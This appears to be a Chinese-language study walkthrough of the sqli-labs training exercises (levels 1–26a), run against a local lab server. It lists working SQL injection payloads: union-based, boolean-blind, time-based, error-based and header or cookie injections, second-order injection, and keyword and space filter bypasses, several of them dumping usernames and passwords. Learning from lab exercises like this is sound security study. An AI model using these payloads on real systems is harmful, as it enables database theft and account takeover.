@@ -1,0 +1,470 @@
+### Lesson1
+`id=1`回显正常
+`id=1'` 报错：check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+
+输入1'导致SQL语句不能正常解析导致程序报错
+
+猜测题目是`id`闭合的
+
+`id=1' --+` 输入和`id=1` 相同
+
+所以是**字符型**且存在SQL注入漏洞
+
+
+**使用联合查询**，首先要知道表格有几列，如果报错就是超过列数，如果显示正常就没超过
+
+`id=1'order by 4 --+` 时报错，所以有3列
+
+然后爆出显示位，就是看表格里面哪一列是在页面显示的
+
+`-1`是为了原本的查询结果不打印
+
+`?id=-1'union select 1,2,3--+`
+在这里，由于注入攻击者已经知道列名和数据类型，因此在 SELECT 命令中使用常量来表示特定的列。
+
+攻击者试图通过在原始查询的末尾添加 ' 字符来终止原始查询，并注入他们自己想要执行的恶意代码。
+通过添加 `--` 字符，攻击者获得了多行注释标记，以防止后面的查询出现错误。
+![](爆显示位.png)
+
+猜测登录名为第二列，密码为第三列
+
+`?id=-1'union select 1,database(),version()--+`
+
+![](爆版本号.png)
+
+--+ 是一种特殊的语法，结合了单行注释和 URL 参数分隔符 + 。--+ 的作用是忽略查询语句中 ID 参数的剩余部分，
+并将其余部分都作为注释来处理。这样，攻击者就可以终止原始查询，并构造自己的查询语句，以利用 SQL 注入漏洞。
+
+开始爆表，`information_schema.tables`表示该数据库下的`tables`表，`group_concat()`是
+将查询结果连接起来。该语句的意思是查询information_schema数据库下的tables表里面且table_schema
+字段内容是security的所有table_name的内容
+
+`?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+`
+
+![](爆表.png)
+
+我们得知当前数据库有四个表，emails，referers，uagents，users，密码可能是在users中，接下来
+要得到该表下的字段名和内容
+
+
+`?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+`
+
+![](爆字段名.png)
+
+敏感字段自然就是username和password，得到对应字段的内容
+
+`?id=-1' union select 1,2,group_concat(username ,id , password) from users--+`
+
+![](得到结果.png)
+
+#### lesson2
+
+`id=1` 正确显示 `id=1'--+` 不显示
+
+猜测为数字型注入
+
+![](数字型注入_1.png)
+`?id=-1 union select 1,2,3--+`
+可知，1不显示，2显示为login name，3显示为password
+
+?id=-1 union select 1,database(),version()--+
+
+显示：
+
+Your Login name:security
+Your Password:5.7.26
+
+`?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables
+where table_schema='security'--+`
+![](数字型注入_2.png)
+
+数据库名为`database()`，表名有`emails,referers,uagents,users`
+
+`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns
+where table_name='users'--+`
+![](数字型注入_3.png)
+
+有价值的列为`username`和`password`
+
+?id=-1 union select 1,2,group_concat(username ,id , password) from users--+
+
+![](数字型注入_4.png)
+
+#### lesson3
+
+在输入`?id=2'`的时候看到页面报错信息。可推断sql语句是单引号字符型且有括号
+
+构造 `?id=5%27)--+` 回显正确
+
+`id=1') order by 4--+`
+
+这个语句中的 id 参数被设置为 1') order by 4--。其中，) 和 order by 之间的空格是为了避免原始查询语句出现语法错误。
+
+在 SQL 查询语句中，ORDER BY 子句用于按指定的列对结果进行排序。4 表示要排序的列号。因为 SQL 中的计数从 1 开始，所以 order by 4 表示按第四列排序。
+
+最后，-- 标记表示其余部分是注释，因此被忽略，这可以防止查询出现语法错误。
+
+接下来的东西不变
+
+```MySQL
+?id=-1') union select 1,2,3--+
+?id=-1') union select 1,database(),version()--+
+?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
+?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
+?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
+```
+
+#### lesson4
+`id=1'` 通过，字符型注入
+
+但是`union select 1,2,3--+` 失效,页面无返回
+
+结合题目说是要双引号
+
+![](lesson4.png)
+
+`http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27--+`
+
+`http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27--+`
+
+`http://127.0.0.1/Less-4/?id=-1%22)%20union%20select%201,2,group_concat(username,id,password)from%20users--+)`
+
+#### lesson5
+
+这回页面没有回显，联合注入失效了，所以需要用布尔注入
+
+可以得知是字符型
+
+布尔注入需要用到`length()`,`ascii()`,`sbustr()`这三个函数，首先通过`length()`函数
+确定长度再通过另外两个确定具体字符是什么，这需要花费大量的时间
+
+`?id=1' and length((select database()))>9--+`
+![](lesson5.png)
+这时没有任何显示，可知数据库长度小于9
+逐个尝试，得知`database()`长度为8
+
+`substr(a,b,c)`a是要截取的字符串，b是截取位置，c是截取长度
+
+该代码逐字符判断`database()`的名字
+
+`id=1' and ascii(substr((select database()),1,1))=115--+`
+
+没报错，证明database()开头是s,接着是e,接着是c,uriy
+`database()`叫security
+
+`?id=1'and length((select group_concat(table_name) from information_schema.tables
+where table_schema=database()))>29--+`
+可知表名长度为29
+
+
+```SQL
+?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
+逐一判断表名
+
+?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
+判断所有字段名的长度
+?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
+逐一判断字段名。
+
+
+?id=1' and length((select group_concat(username,password) from users))>109--+
+判断字段内容长度
+?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
+逐一检测内容。
+
+```
+
+
+#### lesson6 双引号版本的lesson5
+
+#### lesson7
+
+![](lesson7.png)
+可以看到是`‘`注入,因为实用单引号会报错，即破坏了原有的语法结构
+但是`?id=1'--+`依然报错
+那就再加`)`，`?id=1') --+`还是报错
+继续加`)`，`?id=1')) --+`终于成功了，然后就是布尔盲注入
+
+#### lesson8
+这关类似lesson5，只是没有报错信息，仅有一个you are in 作为参照
+
+#### lesson9
+这关不管是`'`和`"`以及再怎么加括号，页面回显都是`you are in`,这个时候布尔注入就失去
+了作用，这时候就需要**时间注入**，需要使用`if`函数和`sleep()`函数
+
+用法如
+```PHP
+if(a,sleep(10),1)
+```
+如果条件语句结果为真，则延迟10秒执行，如果假则执行1，不延迟
+
+先构造永真条件1=1，试出到底是哪种注入，结果是`'`
+
+`?id=1%27%20and%20if(1=1,sleep(5),1)--+`
+
+然后就像布尔注入一样猜了，比如现在猜数据库名长度
+
+`?id=1%27%20and%20if(length((select%20database()))>5,sleep(5),1)--+`
+
+#### lesson10 双引号版本的lesson9
+
+#### lesson11
+之前的注入参数全部构造在`URL`里面，这种是`get`请求方式，现在第11关长这个样子
+
+![](lesson11.png)
+
+这样的方式叫做`post`请求，参数在表单里面，而且现在的参数不再是一个而是两个
+
+当输入错误时会返回错误信息
+
+![](lesson11_1.png)
+
+随便输一个错误请求，如`1'`
+
+![](lesson11_2.png) 提示了一串错误信息
+
+推测sql语句为`username='参数'` and `password='参数'`
+
+这里需要使用新的注释方式，不是`--+`而是`#`，具体可看
+![](lesson11_3.png)
+
+仅注入`Username=1' or 1=1#`完成了注入
+
+![](lesson11_4.png)
+
+又可以用`union select`了
+
+然后就是`union select`的注入方法
+
+`union select 1,database()`
+`union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#`
+
+`union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#`
+
+`union select 1,group_concat(username,id,password) from users#`
+
+#### lesson12
+id=1或者id=1'时无反应，id=1"时报错，那么就是`id=1"`且有括号
+整题为`id=1")`的lesson11翻版
+
+#### lesson13
+构造为`1') or 1=1#`
+
+#### lesson14
+构造`1" or 1=1#`
+
+#### lesson15
+没有报错信息了，但是有正确页面和错误页面，选择布尔盲注入`1' or 1=1#`
+
+`1' or length((select database()))>5`
+
+#### lesson16
+`1") or 1=1#`
+
+#### lesson17
+![](lesson17.png)
+
+十七关和前面关很不一样，根据页面展示是一个密码重置页面，也就是说已经登录系统了，
+根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改为我们输入
+的密码再执行这条sql语句之前会对输入的账户名进行检查，对输入的特殊字符转义。所以我们能够
+利用的只有更新密码的sql语句，sql语句之前都是查询，这里有一个`updata`更新数据库里面的信息。
+
+所以之前的联合注入和布尔注入以及时间注入都不能用了这里会用到**报错注入**
+
+
+报错注入有三种：
+
+ -`extractvalue(XML_document,XPath_string)`
+
+  第一个参数：`XML_document`是`String`格式，为XML文档对象的名称，文中为Doc
+
+  第二个参数：`XPath_string`是`Xpath`格式的字符串
+
+  作用是从XML_document中提取符合XPATH_string的值，当XPath_string语法报错时就会报错，
+
+具体来说，这段代码构造了一个恶意的 SQL 查询语句，通过将当前查询条件设置为 "1' and
+(extractvalue(1,concat(0x5c,version(),0x5c)))"，实现了向数据库中注入一段查询语句的目的。
+其中，extractvalue() 函数用于提取 XML 字符串中的数据，而 0x5c 表示反斜杠 "/" 的 ASCII 码值，
+相当于在字符串中添加反斜杠。因此，这段代码将 version() 函数的返回值包装在反斜杠之间，
+使其转义为一个字符串。最终，这个查询语句将执行并返回 MySQL 数据库的版本号。
+```SQL
+1' and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本
+1' and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库
+
+1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   爆表名
+1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c)))#
+ 爆字段名
+
+1' and (extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。
+1' and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。
+
+```
+
+
+ -`updatexml(XML_document,XPath_string,new_value)`
+
+ 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+
+ 第二个参数：XPath_string(Xpath格式的字符串)
+
+ 第三个参数：new_value,String格式，替换查找到的符合条件的数据
+
+ 作用：改变文档中符合条件的节点的值，改变`XML_document`中符合XPATH_string的值，当XPath_string语法报错时就会报错
+
+```SQL
+123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
+123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库
+
+
+
+123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#
+   爆字段名
+
+123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
+爆密码该格式针对mysql数据库。
+爆其他表就可以，下面是爆emails表
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
+
+1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
+```
+ -`group by()`
+
+```SQL
+123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
+
+
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
+
+
+
+
+1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+
+1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
+
+```
+
+![](lesson17.png)
+
+尝试爆数据库名
+![](lesson17_1.png)
+
+
+#### lesson18
+18的源码里，无论是Username还是password都加了input检查
+但是这里有一个输出agent头的语句
+![](lesson18.png)
+
+阅读源代码可知，由于在agent注入前，先对用户名和密码进行了确定，所以需要输入一个正确的用户名密码才能引发注入
+
+![](lesson18_1.png)
+
+这里修改user-agent为`'or updatexml(1,concat(0x7e,(select database()),0x7e),1) or'`
+使用报错注入，这里爆到了数据库名为`security`
+
+`User-Agent: ' or updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1) or '`
+爆服务器上所有的数据库的名称
+
+
+
+`User-Agent:' or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,31),0x7e),1) or '`
+爆表名
+
+`User-Agent: ' or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from .users),1,31),0x7e),1) or '`
+爆passwd和user
+
+#### lesson19
+![](lesson19.png)
+这回给了Referer
+在Referer进行注入
+
+
+`1',updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1))#`
+
+![](lesson19_1.png)
+
+#### lesson20
+![](lesson20.png)
+当正确输入时，cookie信息会被打印出来，因此对cookie进行注入
+
+![](lesson20_1.png)
+
+`Cookie: uname=Dumb' and updatexml(1,concat(0x5c,substr((select group_concat(username,password)from users),40,31),0x5c),1)#`
+
+
+#### lesson21
+这回的Cookie有base编码
+
+![](lesson21.png)
+单引号的base编码是"Jw=="，代入发现还得有)
+
+`')and updatexml (1,concat(0x5c,(select group_concat(username,password) from users),0x5c),1)#`这是注入代码
+编码为base64，得
+
+`JylhbmQgdXBkYXRleG1sICgxLGNvbmNhdCgweDVjLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzKSwweDVjKSwxKSM=`
+
+![](lesson21_1.png)
+
+注入成功
+#### lesson22
+这个是双引号版本的lesson21，但是具体引号是要自己尝试的，单引号是`Jw==`，双引号是`Ig==`,而且如果要
+本身的Uname，name不能直接加在原uname后门，而是根据原文编码构造payload，哪个报错就说明就应该用哪个注入方式
+
+#### lesson23
+
+`id=1'`出现新的报错信息，肯定是单引号注入，但是后面的注释不管用
+
+![](lesson23.png)
+
+这里得知是注释符被过滤，既然无法注释后面的单引号，那么久要想办法构造补充前后的单引号
+
+`?id=1' or '1'='1`  可绕过
+
+继续用此方法构造`union select`
+
+`?id=-1' union select 1,2,3 or '1'='1`
+
+![](lesson23_1.png) 这样就得知了网页的显示顺序
+
+`?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1`
+
+`?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1`
+
+`?id=-1' union select 1,(select group_concat(username,id,password) from users),3 or '1'='1`
+
+#### lesson24
+这个二次注入的精髓在于登录页面和注册页面对于密码和账户名都使用`mysql_real_escape_string`函
+数对于特殊字符进行转义。但是在注册页面，因为虽然存在函数对特殊字符进行转义，但只是在调用sql
+语句时候进行转义，当注册成功后账户密码存在到数据库的时候是没有转义的，以原本数据存入数据库的。
+当我们修改密码的时候，对于账户名是没有进行过滤的。所以用提前留有后门的用户名、密码，完成注入
+
+
+先注册一个账号叫`admin'#`,污染数据库，单引号是为了和之后密码修改时的用户们的单引号闭合，#是为了注释后面的数据
+
+![](lesson24.png)
+
+这时再修改密码，最后会修改`admin`管理员的密码，而不是`admin'#`的密码
+
+
+#### lesson25
+本题会过滤`or`和`and`，但是用`union select` 跳过就好
+不过`information_schema`需要用`infoorrmation_schema`这种双写替换
+
+#### lesson26
+本题会过滤逻辑运算符，注释符以及空格，对于绕过空格限制有大把的方式对于空格，有较多的方法：
+%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%A0 空格，我在windows和kali里面都用不了，
+可能是因为apache解析不了。只能使用()绕过。报错注入空格使用比较少所以我们可以使用报错注入。
+
+`and`可以被`&& aandnd`替换，`or`可以被`||`替换
+
+爆表名：
+`/?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0`
+
+
+#### lesson26a
+`?id=1%27%a0union%a0select%a01,group_concat(username),group_concat(passwoorrd)%a0from%a0security%2Eusers%a0where%a01%a0%26%26%a0%271`
+这东西Wiondows好像绕过不了
